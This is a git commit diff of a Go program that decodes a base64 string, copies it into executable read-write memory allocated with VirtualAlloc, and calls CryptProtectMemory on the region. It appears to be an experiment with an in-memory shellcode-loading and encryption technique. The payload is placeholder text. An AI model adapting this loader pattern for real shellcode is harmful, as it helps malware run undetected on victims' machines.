e97ee2faa9f2b12552747a29b2b5430f20c63c92
Administrator <1850597152@qq.com>
2021-10-08 00:15:22 +0800

    procCryptProtectMemory

--- new/dpapi/main.go
+++ new/dpapi/main.go
@@ -30,15 +30,17 @@ func main() {
 	/*	s,_:= Decrypt("AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA5Vj52Htm+kOtAg/l1qc35AAAAAACAAAAAAAQZgAAAAEAACAAAABNQhUTQ6cfvjoE6FpcL/cDAqoe5AwuMZP/+rgvot7G4AAAAAAOgAAAAAIAACAAAADZGkd9+C+/oOeMYSB2eqWlMMNYCypxs0Eogrcw+WnfDRAAAACCOXMquX3UdkklqdpXRUZOQAAAAEuc1o99YO31qmUSOGZDWGgCFXm8p9fT/C3JyKi6lscKoDHyolGKSSJAkSYCw5o214qjebHWFRNM+Wa9un7r9g4=")
 		println(s)*/
 
-	ss, _ := base64.StdEncoding.DecodeString("string2000022154")
+	ss, _ := base64.StdEncoding.DecodeString("c2RmZGZzZGY=")
 
 	charcode := []byte(ss)
 
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 
+	println(addr)
+
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
 
-	_, _, err := procCryptProtectMemory.Call(uintptr(unsafe.Pointer(&addr)), uintptr(0), uintptr(CRYPTPROTECTMEMORY_SAME_PROCESS))
+	_, _, err := procCryptProtectMemory.Call(uintptr(addr), uintptr(len(charcode)), uintptr(0x00))
 	if err != nil {
 		panic(err)
 	}
